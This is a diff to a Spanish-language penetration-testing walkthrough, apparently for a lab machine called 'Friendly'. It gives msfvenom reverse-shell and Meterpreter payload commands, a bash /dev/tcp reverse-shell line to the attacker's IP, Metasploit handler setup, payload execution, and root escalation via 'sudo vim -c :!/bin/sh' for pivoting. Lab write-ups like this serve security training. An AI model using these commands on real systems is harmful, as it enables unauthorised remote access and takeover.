@@ -224,7 +224,7 @@ El puerto **21** (FTP) está abierto, permitiendo autenticación con el usuario 
 Genera un payload para obtener acceso remoto con `msfvenom`:
 
 ```bash
-msfvenom -p php/reverse_php LHOST=<IP máquina víctima> LPORT=443 -f raw > pwnws.php
+msfvenom -p php/reverse_php LHOST=<IP máquina atacante> LPORT=443 -f raw > pwnws.php
 ```
 
 #### Paso 3: Subida del Payload
@@ -272,7 +272,7 @@ bash -c "sh -i >& /dev/tcp/<IP máquina atacante>/444 0>&1"
 Para mejorar el control sobre la máquina, generamos un payload de Meterpreter con `msfvenom`:
 
 ```bash
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP máquina atacante> LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus
 ```
 
 #### Paso 3: Compartir el Payload
@@ -322,7 +322,7 @@ set PAYLOAD linux/x86/meterpreter/reverse_tcp
 Asigna la dirección IP de la máquina atacante:
 
 ```bash
-set LHOST 1.2.3.4
+set LHOST <IP máquina atacante>
 ```
 
 #### Paso 5: Ejecutar el Handler
@@ -331,4 +331,56 @@ Inicia el handler para recibir la sesión:
 
 ```bash
 run
+```
+
+### Ejecución del Payload en la Máquina Víctima
+
+#### Paso 1: Asignar Permisos de Ejecución
+
+En la máquina intermedia **Friendly**, otorga permisos de ejecución al archivo malicioso:
+
+```bash
+chmod +x virus
+```
+
+#### Paso 2: Ejecutar el Payload
+
+Inicia la ejecución del archivo para enviar la sesión a Metasploit:
+
+```bash
+./virus
+```
+
+### Escalada de Privilegios
+
+Para realizar pivoting, necesitamos obtener privilegios de **root** ya que como usuarios `www-data` tenemos permisos limitados.
+
+#### Paso 1: Verificación de Permisos
+
+Comprobamos los permisos `sudo` del usuario actual:
+
+```bash
+sudo -l
+```
+
+El resultado muestra que podemos ejecutar el binario `/usr/bin/vim` con privilegios elevados. Antes de continuar, configuramos el TTY:
+
+```bash
+script /dev/null -c bash
+```
+
+#### Paso 2: Escalada de Privilegios con Vim
+
+Consultando **GTFOBins**, encontramos el comando para escalar privilegios utilizando `vim`:
+
+```bash
+sudo vim -c ':!/bin/sh'
+```
+
+### Finalización del Pivoting
+
+Con la sesión de **root** obtenida, podemos completar el proceso de pivoting ejecutando el payload en la máquina intermedia:
+
+```bash
+./virus
 ```
